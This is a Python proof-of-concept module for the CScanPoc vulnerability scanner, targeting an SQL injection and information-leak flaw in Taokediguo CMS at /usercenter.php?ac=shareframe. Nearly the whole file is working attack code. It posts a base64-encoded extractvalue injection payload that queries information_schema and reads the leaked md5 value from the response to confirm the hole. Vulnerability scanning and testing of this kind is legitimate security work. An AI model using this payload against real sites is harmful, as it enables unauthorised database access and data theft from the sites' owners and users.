# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TaokediguoCMS_0001'  # 平台漏洞编号，留空
    name = '淘客帝国CMS 无视GPC注射和信息泄露漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-05-27'  # 漏洞公布时间
    desc = '''
        淘客帝国CMS是一家以淘客推广为主的服务平台，淘客帝国汇聚淘宝客活动所有商品，并集成强大的自定义筛选功能，帮您迅速找到高佣金高转化的推广商品的网站管理系统。
        淘客帝国CMS /usercenter.php?ac=shareframe 无视GPC注射和信息泄露漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '淘客帝国CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7284d261-c5d6-4f6e-8bca-b6f413ba4854'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            path = '/usercenter.php?ac=shareframe'
            verify_url = self.target + path
            post_data = 'url=http://www.baidu.com&mod=setfield&dosubmit=ok&url=eCcsZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDVjLCAoc2VsZWN0IG1kNSgxMjMpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBsaW1pdCAxKSkpLCcnLCcxJywnMScsJzAnLCdfMjEweDIxMC5qcGcnLCdfNjR4NjQuanBnJywnJywnNCcsJ3Rlc3QnLCcxNDMyNzE2MzA4JywnMTQzMjcxNjMwOCcsJzEnLCcxJywnMScpIw==%3D&pcid=1&'
            code, head, res, errcode, _ = hh.http(verify_url, post=post_data)
            code, head, res, errcode, _ = hh.http(verify_url, post=post_data)

            if code == 200 and '202cb962ac59075b964b07152d234b7' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
